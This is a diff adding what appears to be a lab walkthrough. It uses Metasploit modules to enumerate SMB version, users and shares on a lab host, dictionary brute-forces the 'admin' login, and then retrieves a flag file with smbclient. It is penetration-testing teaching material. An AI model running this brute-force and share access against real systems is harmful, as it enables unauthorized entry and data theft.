@@ -1,0 +1,94 @@
+💻 SMB Enumeration and Exploitation WorkflowThis document outlines a workflow for testing and exploiting the Server Message Block (SMB) protocol on a target system, including reconnaissance of version, users, and shares, followed by brute-forcing and manual access.ProtocolServiceAttacker Port (UDP)Target Port (TCP/UDP)SMBServer Message Block137, 138 (NetBIOS)139, 445 (SMB)Target IP192.91.46.3Attacker IP192.91.46.2Phase 1: Environment Setup and Service EnumerationObjective: Set up the Metasploit environment and identify the SMB service version.Setup and InitializationBash# Check local IP and identify target
+ifconfig
+# Attacker IP: 192.91.46.2
+# Target IP: 192.91.46.3
+
+# Start the Metasploit database service
+service postgresql start
+
+# Start Metasploit console
+msfconsole
+
+# Create a new workspace for this task
+msf5 > workspace -a SMB_Enum
+
+# Set the target IP address globally for this workspace
+msf5 > setg RHOSTS 192.91.46.3
+
+# Search for SMB auxiliary modules
+msf5 > search smb
+SMB Version ScanningBash# Select the module for gathering SMB version information
+msf5 > use auxiliary/scanner/smb/smb_version
+
+# View configuration options
+msf5 > show options
+
+# Execute the module
+msf5 > run
+Phase 2: Information Gathering (Users and Shares)Objective: Enumerate valid user accounts and accessible shared folders on the target.User EnumerationBash# Search for SMB modules (if you ran 'back' previously)
+# msf5 > search type:auxiliary name:smb
+
+# Select the module to enumerate users (via SID lookups, etc.)
+msf5 > use auxiliary/scanner/smb/smb_enumusers
+
+# Display module information (optional)
+msf5 > info
+
+# Execute the module
+msf5 > run
+Share Enumeration (and File Listing)Bash# Search for SMB modules (if needed)
+# msf5 > search type:auxiliary name:smb
+
+# Select the module to enumerate shares (public and restricted)
+msf5 > use auxiliary/scanner/smb/smb_enumshares
+
+# View configuration options
+msf5 > show options
+
+# Set option to show files inside accessible shares (if possible)
+msf5 > set ShowFiles true
+
+# Execute the module
+msf5 > run
+Phase 3: Authentication Attack (Brute-Forcing)Objective: Attempt to log in using a dictionary attack against the SMB service.SMB Login Brute-ForceBash# Search for SMB modules (if needed)
+# msf5 > search type:auxiliary name:smb
+
+# Select the module for dictionary-based SMB login attempts
+msf5 > use auxiliary/scanner/smb/smb_login
+
+# View configuration options
+msf5 > show options
+
+# Set a specific username to test (or use a USER_FILE for multiple users)
+msf5 > set SMBUser admin
+# Note: This user must be part of your brute-force strategy.
+
+# Set the path to a file containing passwords
+msf5 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+# Execute the brute-force attack
+msf5 > run
+
+# Exit Metasploit console
+msf5 > exit
+Phase 4: Manual Access and File RetrievalObjective: Use the discovered credentials to manually log in via smbclient and retrieve sensitive data.Listing and Connecting to SharesBash# Use smbclient to list available shares on the target
+smbclient -L //192.91.46.3 -U admin
+# This requires a password if the user 'admin' requires one.
+
+# Connect directly to a discovered share (e.g., 'public')
+smbclient //192.91.46.3/public -U admin
+password: <discovered_password>
+File RetrievalBash# List files in the current directory (the connected share)
+smb: \> ls
+
+# Change directory to a folder containing the flag
+smb: \> cd secret
+
+# Retrieve the target file (e.g., 'flag')
+smb: \> get flag
+
+# Exit the smbclient session
+smb: \> exit
+
+# View the contents of the retrieved file from the attacker's shell
+root@kali:~# cat flag
